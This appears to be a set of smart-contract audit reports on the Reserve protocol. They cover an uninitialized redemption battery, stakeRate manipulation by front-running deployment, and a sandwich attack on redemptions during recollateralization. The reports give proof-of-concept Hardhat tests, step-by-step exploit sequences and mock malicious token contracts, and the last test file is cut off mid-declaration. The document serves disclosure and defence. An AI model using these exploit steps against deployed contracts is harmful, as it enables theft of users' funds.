# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/libraries/RedemptionBattery.sol#L59-L70   # Vulnerability details  ## Impact The `RTokenP1` contract implements a throttling mechanism using the `RedemptionBatteryLib` library. The library models a "battery" which "recharges" linearly block by block, over roughly 1 hour.  RToken.sol ```solidity     function redeem(uint256 amount) external notFrozen {         // ...          uint256 supply = totalSupply();          // ...         battery.discharge(supply, amount); // reverts on over-redemption          // ...     } ``` RedemptionBatteryLib.sol ```solidity     function discharge(         Battery storage battery,         uint256 supply,         uint256 amount     ) internal {         if (battery.redemptionRateFloor == 0 && battery.scalingRedemptionRate == 0) return;          // {qRTok}         uint256 charge = currentCharge(battery, supply);          // A nice error message so people aren't confused why redemption failed         require(amount <= charge, "redemption battery insufficient");          // Update battery         battery.lastBlock = uint48(block.number);         battery.lastCharge = charge - amount;     }      /// @param supply {qRTok} Total RToken supply before the burn step     /// @return charge {qRTok} The current total charge as an amount of RToken     function currentCharge(Battery storage battery, uint256 supply)         internal         view         returns (uint256 charge)     {         // {qRTok/hour} = {qRTok} * D18{1/hour} / D18         uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;          if (battery.redemptionRateFloor > amtPerHour) amtPerHour = battery.redemptionRateFloor;          // {blocks}         uint48 blocks = uint48(block.number) - battery.lastBlock;           // {qRTok} = {qRTok} + {qRTok/hour} * {blocks} / {blocks/hour}         charge = battery.lastCharge + (amtPerHour * blocks) / BLOCKS_PER_HOUR;          uint256 maxCharge = amtPerHour > supply ? supply : amtPerHour;         if (charge > maxCharge) charge = maxCharge;     } ``` The linear redemption limit is calculated in the `currentCharge` function. This function calculates the delta blocks by `uint48 blocks = uint48(block.number) - battery.lastBlock;`.  The bug here is that the `lastBlock` value is never initialized by the `RTokenP1` contract so its value defaults to `0`. This results in incorrect delta blocks value as the delta blocks comes out to be an incorrectly large value ```         blocks = current block number - 0 = current block number ```  Due do this issue, the `currentCharge` value comes out to be way larger than the actual intended value for the first RToken redemption. The `maxCharge` cap at the end of `currentCharge` function caps the result to the current total supply of RToken.   The issue results in an instant first RToken redemption for the full `totalSupply` of the RToken. The battery discharging mechanism is completely neglected.  It should be noted that the issue only exists for the first ever redemption as during the first redemption the `lastBlock` value gets updated with current block number.     ## Proof of Concept The following test case was added to `test/RToken.test.ts` file and was ran using command `PROTO_IMPL=1 npx hardhat test ./test/RToken.test.ts`.  ```typescript   describe.only('Battery lastBlock bug', () => {     it('redemption battery does not work on first redemption', async () => {       // real chain scenario       await advanceBlocks(1_000_000)       await Promise.all(tokens.map((t) => t.connect(addr1).approve(rToken.address, ethers.constants.MaxUint256)))        expect(await rToken.totalSupply()).to.eq(0)       await rToken.connect(owner).setRedemptionRateFloor(fp('1e4'))       await rToken.connect(owner).setScalingRedemptionRate(fp('0'))        // first issue       const issueAmount = fp('10000')       await rToken.connect(addr1)['issue(uint256)'](issueAmount)       expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)       expect(await rToken.totalSupply()).to.eq(issueAmount)        // first redemption       expect(await rToken.redemptionLimit()).to.eq(await rToken.totalSupply())    // for first redemption the currentCharge value is capped by rToken.totalSupply()        await rToken.connect(addr1).redeem(issueAmount)       expect(await rToken.totalSupply()).to.eq(0)        // second redemption       await rToken.connect(addr1)['issue(uint256)'](issueAmount)       expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)       // from second redemtion onwards the battery discharge mechanism takes place correctly       await expect(rToken.connect(addr1).redeem(issueAmount)).to.be.revertedWith('redemption battery insufficient')     })   }) ```  ## Tools Used Hardhat  ## Recommended Mitigation Steps The `battery.lastBlock` value must be initialized in the `init` function of `RTokenP1` ```solidity     function init(         // ...     ) external initializer {         // ...         battery.lastBlock = uint48(block.number);     } ``` 
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L160-L188 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L212-L237   # Vulnerability details  ## Impact code calculates amount of stake token and rsr token based on `stakeRate` and if `stakeRate` was near `1e18` then division error is small but attacker can cause `stakeRate` to be 1 and that can cause users to loss up to `1e18` token during stake and unstake.  ## Proof of Concept this is `init()` code: ```     function init(         IMain main_,         string calldata name_,         string calldata symbol_,         uint48 unstakingDelay_,         uint48 rewardPeriod_,         uint192 rewardRatio_     ) external initializer {         require(bytes(name_).length > 0, "name empty");         require(bytes(symbol_).length > 0, "symbol empty");         __Component_init(main_);         __EIP712_init(name_, "1");         name = name_;         symbol = symbol_;          assetRegistry = main_.assetRegistry();         backingManager = main_.backingManager();         basketHandler = main_.basketHandler();         rsr = IERC20(address(main_.rsr()));          payoutLastPaid = uint48(block.timestamp);         rsrRewardsAtLastPayout = main_.rsr().balanceOf(address(this));         setUnstakingDelay(unstakingDelay_);         setRewardPeriod(rewardPeriod_);         setRewardRatio(rewardRatio_);          beginEra();         beginDraftEra();     } ``` As you can see it sets the value of the `rsrRewardsAtLastPayout` as contract balance when contract is deployed. This is `_payoutReward()` code: ```     function _payoutRewards() internal {         if (block.timestamp < payoutLastPaid + rewardPeriod) return;         uint48 numPeriods = (uint48(block.timestamp) - payoutLastPaid) / rewardPeriod;          uint192 initRate = exchangeRate();         uint256 payout;          // Do an actual payout if and only if stakers exist!         if (totalStakes > 0) {             // Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.             // Apply payout to RSR backing             // payoutRatio: D18 = FIX_ONE: D18 - FixLib.powu(): D18             // Both uses of uint192(-) are fine, as it's equivalent to FixLib.sub().             uint192 payoutRatio = FIX_ONE - FixLib.powu(FIX_ONE - rewardRatio, numPeriods);              // payout: {qRSR} = D18{1} * {qRSR} / D18             payout = (payoutRatio * rsrRewardsAtLastPayout) / FIX_ONE;             stakeRSR += payout;         }          payoutLastPaid += numPeriods * rewardPeriod;         rsrRewardsAtLastPayout = rsrRewards();          // stakeRate else case: D18{qStRSR/qRSR} = {qStRSR} * D18 / {qRSR}         // downcast is safe: it's at most 1e38 * 1e18 = 1e56         // untestable:         //      the second half of the OR comparison is untestable because of the invariant:         //      if totalStakes == 0, then stakeRSR == 0         stakeRate = (stakeRSR == 0 || totalStakes == 0)             ? FIX_ONE             : uint192((totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR);          emit RewardsPaid(payout);         emit ExchangeRateSet(initRate, exchangeRate());     } ``` As you can see it sets the value of the `stakeRate`  to `(totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR`.  So to exploit this attacker needs to perform this steps: 1. send `200 * 1e18` RSR tokens (18 is the precision) to the StRSR address before its deployment by watching mempool and front running. the deployment address is calculable before deployment. 2. function `init()` would get executed and would set `200 * 1e18` as `rsrRewardsAtLastPayout`. 3. then attacker would call `stake()` and stake 1 RSR token (1 wei) in the contract and the value of `stakeRSR` and `totalStakes` would be 1. 4. then attacker wait for `rewardPeriod` seconds and then call `payoutReward()` and code would pay rewards based on `rewardRatio` and `rsrRewardsAtLastPayout` and as `rewardRatio` is higher than 1% (default and normal mode) code would increase `stakeRate` more than `2 * 1e18` amount. and then code would set `stakeRate` as `totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR = 1`. 5. then calls to `stake()` would cause users to lose up to `1e18` RSR tokens as code calculates stake amount as `newTotalStakes = (stakeRate * newStakeRSR) / FIX_ONE` and rounding error happens up to `FIX_ONE`. because the calculated stake amount is worth less than deposited rsr amount up to `1e18`. 6. attacker can still users funds by unstaking 1 token and receiving `1e18` RSR tokens. because of the rounding error in `unstake()`  so attacker can manipulate the `stakeRate` in contract deployment time with sandwich attack which can cause other users to lose funds because of the big rounding error.  ## Tools Used VIM  ## Recommended Mitigation Steps prevent early manipulation of the PPS
# Lines of code  https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L420   # Vulnerability details  ## Impact This is similar to the "high" vulnerability I submitted, but also shows a similar exploit can be done if a user isn't a whale, and isn't issuing anything.   A user can send a redeem TX and an evil actor can make it so they get almost nothing back during recollateralization. This requires ordering transactions, or just getting very unlucky with the order of your transaction.   ## Proof of Concept - UserA is looking to redeem their rToken for tokenA (the max the battery will allow, let's say 100k) - A basket refresh is about to be triggered - Evil user wants the protocol to steal UserA's funds - UserA sends redeem TX to the mempool, but Evil user move transactions around before it hits  - Evil user calls refreshbasket in same block as original collateral (tokenA) is disabled, kicking in backupconfig (tokenB) - Protocol is now undercollateralized but collateral is sound (tokenB is good) - Evil sends 1tokenB to backingManager to UserA's redeem has something to redeem - UserA's redemption tx lands, and redeems 100k rTokens for a fraction of tokenB!   UserA redeems and has nothing to show for it! Evil user only had to buy 1 tokenB (or even less) to steal 100k of their rToken  ## Tools Used  Hardhat  ## Recommended Mitigation Steps  Disallow redemptions/issuance during undercollateralization  ## Proof of Code   To run: 1. git clone https://github.com/reserve-protocol/protocol.git 2. cd protocol 3. Copy paste the below code to a file like `/tmp/changes.patch` 4. git apply /tmp/changes.patch 5. yarn 6. yarn hardhat test test/submission-test.test.ts  ``` diff --git a/contracts/ShitAsset.sol b/contracts/ShitAsset.sol new file mode 100644 index 00000000..5420e914 --- /dev/null +++ b/contracts/ShitAsset.sol @@ -0,0 +1,222 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol"; +import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol"; +import "./plugins/assets/OracleLib.sol"; +import "hardhat/console.sol"; + +contract ShitAsset { +    using FixLib for uint192; +    using OracleLib for AggregatorV3Interface; + +    // AggregatorV3Interface public immutable chainlinkFeed; // {UoA/tok} + +    IERC20Metadata private s_erc20; +    bool revertErc20 = false; + +    CollateralStatus myStatus; + +    uint8 public immutable erc20Decimals; + +    uint192 public immutable maxTradeVolume; // {UoA} + +    uint48 public immutable oracleTimeout; // {s} Seconds that an oracle value is considered valid + +    // uint192 public immutable oracleError; // {1} The max % deviation allowed by the oracle + +    // === Lot price === + +    uint48 public immutable priceTimeout; // {s} The period over which `savedHighPrice` decays to 0 + +    uint192 public savedLowPrice; // {UoA/tok} The low price of the token during the last update + +    uint192 public savedHighPrice; // {UoA/tok} The high price of the token during the last update + +    uint48 public lastSave; // {s} The timestamp when prices were last saved + +    string public name; + +    /// @param priceTimeout_ {s} The number of seconds over which savedHighPrice decays to 0 +    /// @param chainlinkFeed_ Feed units: {UoA/tok} +    /// @param oracleError_ {1} The % the oracle feed can be off by +    /// @param maxTradeVolume_ {UoA} The max trade volume, in UoA +    /// @param oracleTimeout_ {s} The number of seconds until a oracle value becomes invalid +    constructor( +        uint48 priceTimeout_, +        AggregatorV3Interface chainlinkFeed_, +        uint192 oracleError_, // @follow-up , this can change +        IERC20Metadata erc20_, +        uint192 maxTradeVolume_, +        uint48 oracleTimeout_ +    ) { +        require(priceTimeout_ > 0, "price timeout zero"); +        require(address(chainlinkFeed_) != address(0), "missing chainlink feed"); +        require(oracleError_ > 0 && oracleError_ < FIX_ONE, "oracle error out of range"); +        require(address(erc20_) != address(0), "missing erc20"); +        require(maxTradeVolume_ > 0, "invalid max trade volume"); +        require(oracleTimeout_ > 0, "oracleTimeout zero"); +        priceTimeout = priceTimeout_; +        // chainlinkFeed = chainlinkFeed_; +        // oracleError = oracleError_; +        s_erc20 = erc20_; +        // erc20 = IERC20Metadata(0x000000000000000000000000000000000000dEaD); +        erc20Decimals = s_erc20.decimals(); +        maxTradeVolume = maxTradeVolume_; +        oracleTimeout = oracleTimeout_; +        myStatus = CollateralStatus.SOUND; +        savedLowPrice = 0; +        savedHighPrice = 0; +    } + +    function updateErc20(address newErc20) public { +        if (newErc20 == address(0)) { +            revertErc20 = true; +        } +        s_erc20 = IERC20Metadata(newErc20); +    } + +    /// Can revert, used by other contract functions in order to catch errors +    /// Should not return FIX_MAX for low +    /// Should only return FIX_MAX for high if low is 0 +    /// @dev The third (unused) variable is only here for compatibility with Collateral +    /// @param low {UoA/tok} The low price estimate +    /// @param high {UoA/tok} The high price estimate +    function tryPrice() external view virtual returns (uint192 low, uint192 high, uint192) { +        // uint192 p = chainlinkFeed.price(oracleTimeout); // {UoA/tok} +        // uint192 delta = p.mul(oracleError); +        // return (p - delta, p + delta, 0); +        return (savedLowPrice, savedHighPrice, uint192(0)); +    } + +    function updatePrice(uint192 low, uint192 high) public { +        savedLowPrice = uint192(low); +        savedHighPrice = uint192(high); +        lastSave = uint48(block.timestamp); +    } + +    /// Should not revert +    /// Refresh saved prices +    function refresh() public virtual { +        // // @follow-up +        // // wonder if you could make this more gas efficient returning _? +        // try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +        //     // {UoA/tok}, {UoA/tok} +        //     // (0, 0) is a valid price; (0, FIX_MAX) is unpriced +        //     // Save prices if priced +        //     if (high < FIX_MAX) { +        //         savedLowPrice = low; +        //         savedHighPrice = high; +        //         lastSave = uint48(block.timestamp); +        //     } else { +        //         // must be unpriced +        //         // @follow-up +        //         // @pat why not revert here? +        //         assert(low == 0); +        //     } +        // } catch (bytes memory errData) { +        //     // see: docs/solidity-style.md#Catching-Empty-Data +        //     // @follow-up their docs should be updated, they no longer apply to this... +        //     // Why are they not being marked to iffy here? +        //     if (errData.length == 0) revert(); // solhint-disable-line reason-string +        // } +    } + +    // Should not revert +    //@dev Should be general enough to not need to be overridden +    // @return {UoA/tok} The lower end of the price estimate +    // @return {UoA/tok} The upper end of the price estimate +    function price() public view virtual returns (uint192, uint192) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            assert(low <= high); +            return (low, high); +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string +            return (0, FIX_MAX); +        } +    } + +    // Should not revert +    // lotLow should be nonzero when the asset might be worth selling +    // @dev Should be general enough to not need to be overridden +    // @return lotHigh {UoA/tok} The upper end of the lot price estimate +    function lotPrice() external view virtual returns (uint192 lotLow, uint192 lotHigh) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            // if the price feed is still functioning, use that +            lotLow = low; +            lotHigh = high; +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string + +            // if the price feed is broken, use a decayed historical value + +            uint48 delta = uint48(block.timestamp) - lastSave; // {s} +            if (delta >= priceTimeout) return (0, 0); // no price after timeout elapses + +            // {1} = {s} / {s} +            uint192 lotMultiplier = divuu(priceTimeout - delta, priceTimeout); + +            // {UoA/tok} = {UoA/tok} * {1} +            lotLow = savedLowPrice.mul(lotMultiplier); +            lotHigh = savedHighPrice.mul(lotMultiplier); +        } +        assert(lotLow <= lotHigh); +    } + +    // @return {tok} The balance of the ERC20 in whole tokens +    function bal(address account) external view returns (uint192) { +        return shiftl_toFix(s_erc20.balanceOf(account), -int8(erc20Decimals)); +    } + +    function isCollateral() external pure virtual returns (bool) { +        return true; +    } + +    // solhint-disable no-empty-blocks + +    /// Claim rewards earned by holding a balance of the ERC20 token +    /// @dev Use delegatecall +    function claimRewards() external virtual {} + +    // solhint-enable no-empty-blocks +    enum CollateralStatus { +        SOUND, +        IFFY, // When a peg is not holding or a chainlink feed is stale +        DISABLED // When the collateral has completely defaulted +    } + +    function updateStatus(CollateralStatus newStatus) public { +        myStatus = newStatus; +    } + +    // collateral stuff +    function status() public view returns (CollateralStatus) { +        return myStatus; +    } + +    function updateName(string memory newName) public { +        name = newName; +    } + +    function targetName() public view returns (bytes32) { +        // this is "shit" in hex +        return 0x7368697400000000000000000000000000000000000000000000000000000000; +    } + +    function targetPerRef() public view returns (uint192) { +        return FIX_ONE; +    } + +    function refPerTok() public view returns (uint192) { +        return FIX_ONE; +    } + +    function erc20() public view returns (IERC20Metadata) { +        if (revertErc20) { +            revert("revertErc20"); +        } +        return s_erc20; +    } +} diff --git a/contracts/facade/PatrickFacadeWrite.sol b/contracts/facade/PatrickFacadeWrite.sol new file mode 100644 index 00000000..72be7d3a --- /dev/null +++ b/contracts/facade/PatrickFacadeWrite.sol @@ -0,0 +1,214 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "../interfaces/IFacadeWrite.sol"; +import "./lib/FacadeWriteLib.sol"; +import "hardhat/console.sol"; + +/** + * @title FacadeWrite + * @notice A UX-friendly layer to interact with the protocol + * @dev Under the hood, uses two external libs to deal with blocksize limits. + */ +contract PatrickFacadeWrite is IFacadeWrite { +    using FacadeWriteLib for address; + +    IDeployer public immutable deployer; + +    constructor(IDeployer deployer_) { +        require(address(deployer_) != address(0), "invalid address"); +        deployer = deployer_; +    } + +    /// Step 1 +    function deployRToken( +        ConfigurationParams calldata config, +        SetupParams calldata setup +    ) external returns (address) { +        // Perform validations +        require(setup.primaryBasket.length > 0, "no collateral"); +        require(setup.primaryBasket.length == setup.weights.length, "invalid length"); + +        // Validate backups +        for (uint256 i = 0; i < setup.backups.length; ++i) { +            require(setup.backups[i].backupCollateral.length > 0, "no backup collateral"); +        } + +        // Validate beneficiaries +        for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +            require( +                setup.beneficiaries[i].beneficiary != address(0) && +                    (setup.beneficiaries[i].revShare.rTokenDist > 0 || +                        setup.beneficiaries[i].revShare.rsrDist > 0), +                "beneficiary revShare mismatch" +            ); +        } + +        // Deploy contracts +        IRToken rToken = IRToken( +            deployer.deploy( +                config.name, +                config.symbol, +                config.mandate, +                address(this), // set as owner +                config.params +            ) +        ); + +        // Get Main +        IMain main = rToken.main(); +        IAssetRegistry assetRegistry = main.assetRegistry(); +        IBackingManager backingManager = main.backingManager(); +        IBasketHandler basketHandler = main.basketHandler(); + +        // Register assets +        for (uint256 i = 0; i < setup.assets.length; ++i) { +            require(assetRegistry.register(setup.assets[i]), "duplicate asset"); +            backingManager.grantRTokenAllowance(setup.assets[i].erc20()); +        } + +        // Setup basket +        { +            IERC20[] memory basketERC20s = new IERC20[](setup.primaryBasket.length); + +            // Register collateral +            for (uint256 i = 0; i < setup.primaryBasket.length; ++i) { +                // require(assetRegistry.register(setup.primaryBasket[i]), "duplicate collateral"); +                assetRegistry.register(setup.primaryBasket[i]); +                IERC20 erc20 = setup.primaryBasket[i].erc20(); + +                basketERC20s[i] = erc20; +                backingManager.grantRTokenAllowance(erc20); +            } + +            // Set basket + +            // can't issue without setting and call ing refresh +            basketHandler.setPrimeBasket(basketERC20s, setup.weights); +            basketHandler.refreshBasket(); +        } + +        // Setup backup config +        { +            for (uint256 i = 0; i < setup.backups.length; ++i) { +                IERC20[] memory backupERC20s = new IERC20[]( +                    setup.backups[i].backupCollateral.length +                ); + +                for (uint256 j = 0; j < setup.backups[i].backupCollateral.length; ++j) { +                    ICollateral backupColl = setup.backups[i].backupCollateral[j]; +                    assetRegistry.register(backupColl); // do not require the asset is new +                    IERC20 erc20 = backupColl.erc20(); +                    backupERC20s[j] = erc20; +                    backingManager.grantRTokenAllowance(erc20); +                } + +                basketHandler.setBackupConfig( +                    setup.backups[i].backupUnit, +                    setup.backups[i].diversityFactor, +                    backupERC20s +                ); +            } +        } + +        // // Setup revshare beneficiaries +        // for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +        //     main.distributor().setDistribution( +        //         setup.beneficiaries[i].beneficiary, +        //         setup.beneficiaries[i].revShare +        //     ); +        // } + +        // // Pause until setupGovernance +        // main.pause(); + +        // // Setup deployer as owner to complete next step - do not renounce roles yet +        main.grantRole(OWNER, msg.sender); + +        // Return rToken address +        return address(rToken); +    } + +    /// Step 2 +    /// @return newOwner The address of the new owner +    function setupGovernance( +        IRToken rToken, +        bool deployGovernance, +        bool unpause, +        GovernanceParams calldata govParams, +        address owner, +        address guardian, +        address pauser +    ) external returns (address newOwner) { +        // Get Main +        IMain main = rToken.main(); + +        require(main.hasRole(OWNER, address(this)), "ownership already transferred"); +        require(main.hasRole(OWNER, msg.sender), "not initial deployer"); + +        // Remove ownership to sender +        main.revokeRole(OWNER, msg.sender); + +        if (deployGovernance) { +            require(owner == address(0), "owner should be empty"); + +            TimelockController timelock = new TimelockController( +                govParams.timelockDelay, +                new address[](0), +                new address[](0) +            ); + +            // Deploy Governance contract +            address governance = FacadeWriteLib.deployGovernance( +                IStRSRVotes(address(main.stRSR())), +                timelock, +                govParams.votingDelay, +                govParams.votingPeriod, +                govParams.proposalThresholdAsMicroPercent, +                govParams.quorumPercent +            ); +            emit GovernanceCreated(rToken, governance, address(timelock)); + +            // Setup Roles +            timelock.grantRole(timelock.PROPOSER_ROLE(), governance); // Gov only proposer +            timelock.grantRole(timelock.CANCELLER_ROLE(), guardian); // Guardian as canceller +            timelock.grantRole(timelock.EXECUTOR_ROLE(), address(0)); // Anyone as executor +            timelock.revokeRole(timelock.TIMELOCK_ADMIN_ROLE(), address(this)); // Revoke admin role + +            // Set new owner to timelock +            newOwner = address(timelock); +        } else { +            require(owner != address(0), "owner not defined"); +            newOwner = owner; +        } + +        // Setup guardian as freeze starter / extender + pauser +        if (guardian != address(0)) { +            // As a further decentralization step it is suggested to further differentiate between +            // these two roles. But this is what will make sense for simple system setup. +            main.grantRole(SHORT_FREEZER, guardian); +            main.grantRole(LONG_FREEZER, guardian); +            main.grantRole(PAUSER, guardian); +        } + +        // Setup Pauser +        if (pauser != address(0)) { +            main.grantRole(PAUSER, pauser); +        } + +        // Unpause if required +        if (unpause) { +            main.unpause(); +        } + +        // Transfer Ownership and renounce roles +        main.grantRole(OWNER, newOwner); +        main.grantRole(SHORT_FREEZER, newOwner); +        main.grantRole(LONG_FREEZER, newOwner); +        main.grantRole(PAUSER, newOwner); +        main.renounceRole(OWNER, address(this)); +        main.renounceRole(SHORT_FREEZER, address(this)); +        main.renounceRole(LONG_FREEZER, address(this)); +        main.renounceRole(PAUSER, address(this)); +    } +} diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol index 648d1813..ed058a0d 100644 --- a/contracts/p1/mixins/RecollateralizationLib.sol +++ b/contracts/p1/mixins/RecollateralizationLib.sol @@ -435,14 +435,11 @@ library RecollateralizationLibP1 {            // accumulate shortfall          for (uint256 i = 0; i < len; ++i) { -            uint192 q = components.bh.quantity(basketERC20s[i]); -            if (q == 0) continue; // can happen if current basket is out of sync with registry +            ICollateral coll = components.reg.toColl(basketERC20s[i]);                // {tok} = {BU} * {tok/BU}              // needed: quantity of erc20 needed for `basketsTop` BUs -            uint192 needed = basketsTop.mul(q, CEIL); // {tok} - -            ICollateral coll = components.reg.toColl(basketERC20s[i]); +            uint192 needed = basketsTop.mul(components.bh.quantity(basketERC20s[i]), CEIL); // {tok}                // held: quantity of erc20 owned by the bm (BackingManager)              uint192 held = coll.bal(address(components.bm)); // {tok} diff --git a/contracts/plugins/assets/FiatCollateral.sol b/contracts/plugins/assets/FiatCollateral.sol index 600f5a78..d49d1292 100644 --- a/contracts/plugins/assets/FiatCollateral.sol +++ b/contracts/plugins/assets/FiatCollateral.sol @@ -60,7 +60,9 @@ contract FiatCollateral is ICollateral, Asset {      uint192 public prevReferencePrice; // previous rate, {ref/tok}        /// @param config.chainlinkFeed Feed units: {UoA/ref} -    constructor(CollateralConfig memory config) +    constructor( +        CollateralConfig memory config +    )          Asset(              config.priceTimeout,              config.chainlinkFeed, @@ -99,11 +101,7 @@ contract FiatCollateral is ICollateral, Asset {          view          virtual          override -        returns ( -            uint192 low, -            uint192 high, -            uint192 pegPrice -        ) +        returns (uint192 low, uint192 high, uint192 pegPrice)      {          pegPrice = chainlinkFeed.price(oracleTimeout); // {target/ref}   @@ -220,4 +218,9 @@ contract FiatCollateral is ICollateral, Asset {      function isCollateral() external pure virtual override(Asset, IAsset) returns (bool) {          return true;      } + +    // Helper function for testing +    function setStatus(CollateralStatus newStatus) public { +        markStatus(newStatus); +    }  } diff --git a/contracts/plugins/mocks/DoubleEntryToken.sol b/contracts/plugins/mocks/DoubleEntryToken.sol new file mode 100644 index 00000000..01b5d57e --- /dev/null +++ b/contracts/plugins/mocks/DoubleEntryToken.sol @@ -0,0 +1,33 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; +import "./MaliciousToken.sol"; + +contract DoubleEntryToken { +    address public s_tokenToForward; +    MaliciousToken public s_token; + +    function decimals() public view returns (uint8) { +        return s_token.decimals(); +    } + +    constructor(address tokenToForward) { +        s_tokenToForward = tokenToForward; +        s_token = MaliciousToken(tokenToForward); +    } + +    function balanceOf(address account) public view returns (uint256) { +        return s_token.balanceOf(account); +    } + +    function transfer(address recipient, uint256 amount) public returns (bool) { +        s_token.forwarderTransferFrom(msg.sender, recipient, amount); +        return true; +    } + +    function transferFrom(address from, address to, uint256 amount) public returns (bool) { +        s_token.forwarderTransferFrom(from, to, amount); +        return true; +    } +} diff --git a/contracts/plugins/mocks/MaliciousToken.sol b/contracts/plugins/mocks/MaliciousToken.sol new file mode 100644 index 00000000..2d0d2209 --- /dev/null +++ b/contracts/plugins/mocks/MaliciousToken.sol @@ -0,0 +1,30 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; + +contract MaliciousToken is ERC20 { +    // solhint-disable-next-line no-empty-blocks +    constructor(string memory name, string memory symbol) ERC20(name, symbol) {} + +    function forwarderTransferFrom( +        address from, +        address to, +        uint256 amount +    ) external returns (bool) { +        _transfer(from, to, amount); +        return true; +    } + +    function mint(address recipient, uint256 amount) external { +        _mint(recipient, amount); +    } + +    function burn(address sender, uint256 amount) external { +        _burn(sender, amount); +    } + +    function adminApprove(address owner, address spender, uint256 amount) external { +        _approve(owner, spender, amount); +    } +} diff --git a/test/submission-test.test.ts b/test/submission-test.test.ts new file mode 100644 index 00000000..cb915c87 --- /dev/null +++ b/test/submission-test.test.ts @@ -0,0 +1,472 @@ +import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers' +import { expect } from 'chai' +import { BigNumber, ContractFactory, Wallet } from 'ethers' +import { ethers, waffle } from 'hardhat' +import { +    IConfig, +    IGovParams, +    IRevenueShare, +    IRTokenConfig, +    IRTokenSetup, +} from '../common/configuration' +import { +    CollateralStatus, +    SHORT_FREEZER, +    LONG_FREEZER, +    MAX_UINT256, +    OWNER, +    PAUSER, +    ZERO_ADDRESS, +    BN_SCALE_FACTOR, +} from '../common/constants' +import { expectInIndirectReceipt, expectInReceipt } from '../common/events' +import { bn, fp, divCeil, toBNDecimals } from '../common/numbers' +import { expectPrice, setOraclePrice } from './utils/oracles' +import { advanceTime, advanceBlocks, getLatestBlockNumber } from './utils/time' +import snapshotGasCost from './utils/snapshotGasCost' +import { +    Asset, +    CTokenFiatCollateral, +    CTokenMock, +    ERC20Mock, +    IBasketHandler, +    FacadeRead, +    FacadeTest, +    FacadeWrite, +    PatrickFacadeWrite, +    FiatCollateral, +    Governance, +    IAssetRegistry, +    RTokenAsset, +    TestIBackingManager, +    TestIBroker, +    TestIDeployer, +    TestIDistributor, +    TestIFurnace, +    TestIMain, +    TestIRevenueTrader, +    TestIStRSR, +    TestIRToken, +    TimelockController, +    USDCMock, +    ShitAsset, +    DoubleEntryToken, +    MaliciousToken, +    MockV3Aggregator, +    GnosisMock, + +} from '../typechain' +import { +    Collateral, +    Implementation, +    IMPLEMENTATION, +    defaultFixture, +    ORACLE_ERROR, +    PRICE_TIMEOUT, +    ORACLE_TIMEOUT +} from './fixtures' +import { useEnv } from '#/utils/env' + + +const createFixtureLoader = waffle.createFixtureLoader + +const describeGas = +    IMPLEMENTATION == Implementation.P1 && useEnv('REPORT_GAS') ? describe : describe.skip + +describe('FacadeWrite contract', () => { +    let deployerUser: SignerWithAddress +    let owner: SignerWithAddress +    let addr1: SignerWithAddress +    let addr2: SignerWithAddress +    let addr3: SignerWithAddress +    let beneficiary1: SignerWithAddress +    let beneficiary2: SignerWithAddress + +    // RSR +    let rsr: ERC20Mock +    let rsrAsset: Asset + +    // Tokens +    let token: ERC20Mock +    let usdc: USDCMock +    let cToken: CTokenMock +    let basket: Collateral[] + +    // Aave / Comp +    let compToken: ERC20Mock +    let shitToken: ERC20Mock +    let shitToken2: ERC20Mock + +    // Assets +    let tokenAsset: FiatCollateral +    let usdcAsset: FiatCollateral +    let cTokenAsset: CTokenFiatCollateral +    let shitAsset: ShitAsset +    let notSoShitAsset: ShitAsset +    let rTokenAsset: RTokenAsset +    let compAsset: Asset + +    // Trading +    let gnosis: GnosisMock + +    // Config +    let config: IConfig + +    // Deployer +    let deployer: TestIDeployer + +    // Governor +    let governor: Governance +    let timelock: TimelockController + +    // Facade +    let facade: FacadeRead +    let facadeTest: FacadeTest +    let collateralArray: Collateral[] +    let facadeWriteLibAddr: string + +    // Core contracts +    let main: TestIMain +    let assetRegistry: IAssetRegistry +    let backingManager: TestIBackingManager +    let basketHandler: IBasketHandler +    let broker: TestIBroker +    let distributor: TestIDistributor +    let furnace: TestIFurnace +    let rToken: TestIRToken +    let rTokenTrader: TestIRevenueTrader +    let rsrTrader: TestIRevenueTrader +    let stRSR: TestIStRSR + +    let facadeWrite: PatrickFacadeWrite +    let facadeRead: FacadeRead +    let rTokenConfig: IRTokenConfig +    let rTokenSetup: IRTokenSetup +    let badBackupRTokenSetup: IRTokenSetup +    let govParams: IGovParams + +    let revShare1: 